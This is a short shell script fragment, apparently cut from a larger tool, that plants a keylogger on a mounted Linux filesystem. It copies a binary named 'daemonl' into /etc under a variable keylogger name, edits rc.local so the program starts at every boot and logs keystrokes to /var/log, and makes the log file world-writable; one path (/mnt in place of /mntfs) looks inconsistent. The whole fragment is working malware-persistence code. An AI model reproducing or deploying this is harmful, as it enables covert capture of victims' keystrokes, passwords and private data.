
if [ ! -f /mntfs/etc/$KEYLOGGER ]; then
  /bin/cp /bin/daemonl /mntfs/etc/$KEYLOGGER

  line=\\\`/bin/grep -n "^exit 0" /mntfs/etc/rc.local | /bin/cut -d: -f 1\\\`
  rc_payload="/etc/$KEYLOGGER -l /var/log/${KEYLOGGER}.log"
  temp=\\\`/bin/mktemp\\\`
  /bin/head -n \\$((line - 1)) /mntfs/etc/rc.local > \\$temp
  echo \\$rc_payload >> \\$temp
  /bin/tail -n +\\$line /mntfs/etc/rc.local >> \\$temp
  /bin/cp \\$temp /mntfs/etc/rc.local

  /bin/touch /mntfs/var/log/${KEYLOGGER}.log
  /bin/chmod ugo+rw /mnt/var/log/${KEYLOGGER}.log
fi

